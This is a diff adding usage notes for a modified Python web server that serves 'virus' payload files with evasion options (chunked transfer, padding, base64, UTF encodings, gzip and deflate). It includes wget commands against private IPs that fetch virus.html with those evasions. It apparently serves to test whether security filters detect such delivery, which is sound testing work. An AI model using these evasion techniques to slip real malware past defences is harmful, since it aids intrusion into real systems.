@@ -1,0 +1,47 @@
+
+Start the Server : 
+
+
+# python http-web.py 
+
+Note : In this server machine, we are start python based web server where we modified server and added number of evasion technology support. In this server the payload files are store in "static" folder. These files you can download in client machine using bellow wget command. 
+
+Now Server running on 80 port.
+
+
+Here In server there are different file evasion method support available. 
+
+1. utf8bom
+2. utf8
+3. base64
+4. utf16_LE
+5. utf16
+6. utf32_LE
+7. utf32
+8. chunked
+9. Padding
+10. deflat
+11. gzip
+
+In Client Machine, you can use following command to download virus payload with dofferent evasion technology.
+
+Download virus.html with chunked.
+# wget --header="Content-Encoding: default" --header="Content-Type: text/html" http://10.40.139.229/virus.html?type=html%26compress=None%26chunked=yes%26characterset=None%26padding=None
+
+Download virus.html with chunked and padding add 1MB.
+# wget --header="Content-Encoding: default" --header="Content-Type: text/html" http://10.40.139.229/virus.html?type=html%26compress=None%26chunked=yes%26characterset=None%26padding=1
+
+
+Download virus.html with base64 encoding
+wget --header="Content-Encoding: default" --header="Content-Type: text/html" http://192.168.20.12/virus.html?type=html%26compress=None%26chunked=None%26characterset=base64%26padding=None
+
+
+In Url You can configure payload name with different evasion technology. 
+
+Here in URL, 
+
+compress = gzip / deflate / None
+chunked = yes / None
+characterset = utf8 / utf32 / utf16 / None / base64
+
+
